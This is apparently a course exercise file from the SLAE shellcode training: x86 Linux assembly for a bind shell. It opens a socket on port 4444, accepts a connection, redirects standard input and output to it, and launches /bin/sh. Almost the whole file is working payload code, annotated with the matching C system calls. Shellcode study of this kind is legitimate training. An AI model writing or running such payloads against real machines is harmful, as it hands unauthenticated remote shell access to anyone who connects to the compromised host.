; Filename: Bind-Shell-StaticParams.nasm
; Author  : Andrea Perfetti
; SLAE ID : SLAE - 1547

global _start

_start:
	; Zeroing the registers	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	;// Creating File Descriptor for the Socket	
	;socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	mov ax, 0x167		; #define __NR_socket 359
	mov bl, 0x2		; AF_INET = 2
	mov cl, 0x1		; SOCK_STREAM = 1
	int 0x80		; FD will be stored in eax
	mov edi, eax		; Copying socket_fd into edi
	xor eax, eax		; Cleaning eax

	;// Binding the socket to server address
	;struct sockaddr_in server_address; 
	mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)

	;server_address.sin_addr.s_addr = INADDR_ANY;
	push eax	
	push eax
	push eax		; Push 0x0 (INADDR_ANY)

	;server_address.sin_port = htons(4444);
	push word 0x5c11	; DEC 4444 -> HEX 0x115c (Bytes to be reversed due to little-endian)

	;server_address.sin_family = AF_INET;
	push word 0x02		; AF_INET = 2


	;bind(socket_fd, (struct sockaddr *)&server_address, sizeof(server_address)); 
	mov ax, 0x0169		; #define __NR_bind 361
	mov ebx, edi		; ebx = socket_fd
	mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
	sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
	int 0x80


	;// Activate listening on the socked
	;listen(socket_fd, 0); 
	xor eax, eax		; eax = 0
	mov ax, 0x016b		; #define __NR_listen 363
	mov ebx, edi		; ebx = socket_fd
	xor ecx, ecx		; ecx = 0
	int 0x80


	;// Accept new connections on the socket
	;int connection_fd;
	;connection_fd = accept(socket_fd, NULL, NULL);
	xor eax, eax		; eax = 0
	mov ax, 0x16C		; #define __NR_accept4 364
	mov ebx, edi		; ebx = socket_fd
	xor ecx, ecx		; ecx = 0
	xor edx, edx		; edx = 0
	int 0x80		; connection_fd will be stored in eax
	mov esi, eax		; esi = connection_fd


	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
	;dup2(connection_fd, 0); 
	;dup2(connection_fd, 1);
	;dup2(connection_fd, 2);

	xor ecx, ecx		; ecx = 0
	mov cl, 0x3		; will need to loop 3 times. 	
_dup_loop:
	xor eax, eax
	mov al, 0x3f		; #define __NR_dup2 63
	mov ebx, esi		; ebx = connection_fd
	dec cl			; decrease ecx to get actual FD
	int 0x80
	jnz _dup_loop		; loop until ecx becomes -1 (sign flag)


	;// Invoking EXECVE
	;execve("/bin/sh", NULL, NULL);
	xor eax, eax		; eax = 0

	push eax		; push eax (0x0 as null terminator)
	push 0x68732f2f
	push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
	mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')
	
	push eax		; push 0x0
	mov edx, esp		; edx = pointer to TOS (null)

	push ebx		; push ebx (pointer to string '/bin//sh')
	mov ecx, esp		; ecx = pointer to TOS

	mov al, 0x0b		; #define __NR_execve 11
	int 0x80


	;// Return
	;return 0;
	xor eax, eax
	xor ebx, ebx
	inc eax
	int 0x80